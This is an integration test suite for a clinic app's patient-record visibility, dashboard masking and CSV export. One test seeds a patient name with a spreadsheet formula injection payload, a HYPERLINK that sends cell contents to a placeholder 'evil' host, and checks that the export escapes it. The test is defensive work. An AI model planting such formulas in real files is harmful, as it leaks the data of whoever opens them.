/**
 * A2b-S-vis (30-sep) — visibilidad de HC por nivel de acceso, del lado
 * POSITIVO y de las superficies de lectura. Los rechazos (básico y tenant
 * ajeno) están en authz-matrix.test.ts; acá se prueba que:
 *  - el asignado y el compartido (PRACTITIONER, acceso `full`) SÍ pueden
 *    (control anti-false-green: si el gate rechazara todo, authz-matrix
 *    seguiría en verde);
 *  - el dashboard enmascara las filas básicas (sin diagnóstico ni OS/copago);
 *  - el export CSV incluye archivados cuando se piden, audita y escapa
 *    fórmulas.
 */
import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { randomUUID } from "node:crypto";
import type { PrismaClient } from "@prisma/client";
import {
  setPatientDiagnosis,
  recordEvaScore,
  setPatientArchived,
  getPatientActivity,
} from "@/lib/patients";
import { exportPatientsCsv as exportPatientsCsvFor } from "@/lib/patients-export-internal";
import { getActor } from "@/lib/session";
import { listPatientFiles } from "@/lib/files";
import { getDashboardData } from "@/lib/dashboard";
import { localToARIso } from "@/lib/datetime-ar";
import {
  ownerClient,
  createEphemeralTenant,
  addPatient,
  addPractitioner,
  type EphemeralTenant,
} from "@/tests/helpers/tenant-factory";
import { asUser } from "@/tests/helpers/actor";

/** Revisión A2: el export es server-only con firma `(actor, opts)`; la ruta le pasa su actor. */
const exportPatientsCsv = async (opts?: Parameters<typeof exportPatientsCsvFor>[1]) =>
  exportPatientsCsvFor(await getActor(), opts);

const RUN = process.env.INTEGRATION === "1";

describe.skipIf(!RUN)("A2b-S-vis · visibilidad de HC y export", () => {
  let db: PrismaClient;
  let T: EphemeralTenant;
  let kineA: { userId: string; practitionerId: string }; // asignado a `pat`
  let kineB: { userId: string; practitionerId: string }; // sin acceso a `pat`
  let kineShared: { userId: string; practitionerId: string }; // share sobre `pat`
  let pat: string;
  let fileId: string;

  beforeAll(async () => {
    db = ownerClient();
    T = await createEphemeralTenant(db);
    kineA = await addPractitioner(db, T, "PRACTITIONER");
    kineB = await addPractitioner(db, T, "PRACTITIONER");
    kineShared = await addPractitioner(db, T, "PRACTITIONER");
    pat = await addPatient(db, T, {
      firstName: "Ana",
      lastName: "Visible",
      email: "ana@test.local",
      assignedPractitionerId: kineA.practitionerId,
    });
    await db.patientShare.create({
      data: { tenantId: T.tenantId, patientId: pat, practitionerId: kineShared.practitionerId },
    });
    const file = await db.patientFile.create({
      data: {
        tenantId: T.tenantId,
        patientId: pat,
        name: "rx-columna.pdf",
        mime: "application/pdf",
        sizeBytes: 4,
        storageKey: `stub:${randomUUID()}`,
        category: "REPORT",
      },
    });
    fileId = file.id;
    // Plan con una sesión CERRADA (alimenta "Pacientes recientes") y un
    // turno futuro de kineB con este paciente (alimenta "Próximos" de kineB).
    await db.treatmentProgram.create({
      data: {
        tenantId: T.tenantId,
        patientId: pat,
        title: "Lumbalgia crónica",
        totalSessions: 6,
        startDate: new Date(Date.now() - 7 * 86_400_000),
        sessions: {
          create: [
            {
              practitionerId: kineA.practitionerId,
              index: 1,
              scheduledFor: new Date(Date.now() - 86_400_000),
              completedAt: new Date(Date.now() - 86_400_000),
            },
          ],
        },
      },
    });
    const future = new Date(Date.now() + 3 * 86_400_000).toISOString().slice(0, 10);
    await db.booking.create({
      data: {
        tenantId: T.tenantId,
        patientId: pat,
        practitionerId: kineB.practitionerId,
        serviceId: T.serviceId,
        scheduledFor: new Date(localToARIso(`${future}T10:00:00`)),
        durationMin: 45,
        status: "CONFIRMED",
        idempotencyKey: randomUUID(),
      },
    });
  });

  afterAll(async () => {
    await T?.cleanup();
    await db?.$disconnect();
  });

  describe("control positivo: acceso full por asignación o share", () => {
    it("el asignado edita diagnóstico y carga EVA", async () => {
      asUser(kineA.userId);
      expect((await setPatientDiagnosis(pat, "Lumbalgia mecánica", "L4-L5")).ok).toBe(true);
      expect(await db.patient.count({ where: { id: pat, diagnosisTitle: "Lumbalgia mecánica" } })).toBe(1);
      const r = await recordEvaScore({ patientId: pat, value: 6, source: "pre" });
      expect(r.ok).toBe(true);
      expect(await db.evaScore.count({ where: { patientId: pat, source: "pre" } })).toBe(1);
    });

    it("el asignado ve archivos y actividad", async () => {
      asUser(kineA.userId);
      expect((await listPatientFiles(pat)).map((f) => f.id)).toEqual([fileId]);
      const feed = await getPatientActivity(pat);
      expect(feed.some((e) => e.action === "patient.diagnosis.update")).toBe(true);
    });

    it("el compartido ve archivos (share = full)", async () => {
      asUser(kineShared.userId);
      expect((await listPatientFiles(pat)).map((f) => f.id)).toEqual([fileId]);
    });

    it("el asignado archiva y desarchiva", async () => {
      asUser(kineA.userId);
      expect((await setPatientArchived({ id: pat, archived: true })).ok).toBe(true);
      expect(await db.patient.count({ where: { id: pat, archivedAt: { not: null } } })).toBe(1);
      expect((await setPatientArchived({ id: pat, archived: false })).ok).toBe(true);
      expect(await db.patient.count({ where: { id: pat, archivedAt: null } })).toBe(1);
    });
  });

  describe("dashboard", () => {
    it("fila básica en recientes: sin diagnóstico, sin progreso, sin id de turno", async () => {
      asUser(kineB.userId);
      const d = await getDashboardData();
      const row = d.recent.find((r) => r.id === pat);
      expect(row).toBeDefined();
      expect(row).toMatchObject({
        access: "basic",
        cond: "",
        sessionsDone: 0,
        sessionsTotal: 0,
        nextBookingId: null,
        nextBookingUpdatedAt: null,
      });
      // "Próximos" de kineB: su turno con un paciente ajeno → solo el servicio.
      expect(d.next).toHaveLength(1);
      expect(d.next[0].tag).toBe("Consulta");
      expect(d.next[0].name).toBe("Ana Visible");
    });

    it("fila full en recientes: diagnóstico/plan y lock del próximo turno", async () => {
      asUser(kineA.userId);
      const d = await getDashboardData();
      const row = d.recent.find((r) => r.id === pat);
      expect(row?.access).toBe("full");
      expect(row?.cond).toBe("Lumbalgia crónica");
      expect(row?.nextBookingId).not.toBeNull();
      expect(row?.nextBookingUpdatedAt).toBeInstanceOf(Date);
    });

    it("OWNER ve el tag completo del próximo turno (servicio + copago)", async () => {
      asUser(T.userId);
      const d = await getDashboardData();
      expect(d.next[0].tag.startsWith("Consulta - ")).toBe(true);
    });
  });

  describe("export CSV", () => {
    it("escapa fórmulas en celdas de texto", async () => {
      const evil = await addPatient(db, T, {
        firstName: '=HYPERLINK("http://evil/?"&A1,"ver")',
        lastName: "@Malicioso",
      });
      asUser(T.userId);
      const csv = await exportPatientsCsv({ ids: [evil] });
      const line = csv.trim().split("\n")[1];
      expect(line).toContain(",'@Malicioso,");
      expect(line).toContain('"\'=HYPERLINK(""http://evil/?""&A1,""ver"")"');
      expect(line).not.toMatch(/,=HYPERLINK/);
    });

    it("incluye archivados solo cuando se piden, y con ids explícitos", async () => {
      const arch = await addPatient(db, T, { lastName: "Archivado" });
      await db.patient.update({ where: { id: arch }, data: { archivedAt: new Date() } });
      asUser(T.userId);
      expect(await exportPatientsCsv()).not.toContain(arch);
      expect(await exportPatientsCsv({ archived: "include" })).toContain(arch);
      const only = await exportPatientsCsv({ archived: "only" });
      expect(only).toContain(arch);
      expect(only).not.toContain(pat);
      // Selección hecha en la pestaña "Archivados" (antes bajaba vacío).
      expect(await exportPatientsCsv({ ids: [arch] })).toContain(arch);
    });

    it("audita cada export con cantidades", async () => {
      asUser(kineB.userId);
      const before = await db.auditEvent.count({ where: { tenantId: T.tenantId, action: "patient.export" } });
      await exportPatientsCsv({ ids: [pat] });
      const ev = await db.auditEvent.findFirst({
        where: { tenantId: T.tenantId, action: "patient.export", actorId: kineB.userId },
        orderBy: { createdAt: "desc" },
      });
      expect(await db.auditEvent.count({ where: { tenantId: T.tenantId, action: "patient.export" } })).toBe(before + 1);
      expect(ev?.payload).toMatchObject({ count: 1, basicCount: 1, archived: "include", requestedIds: 1 });
    });
  });
});
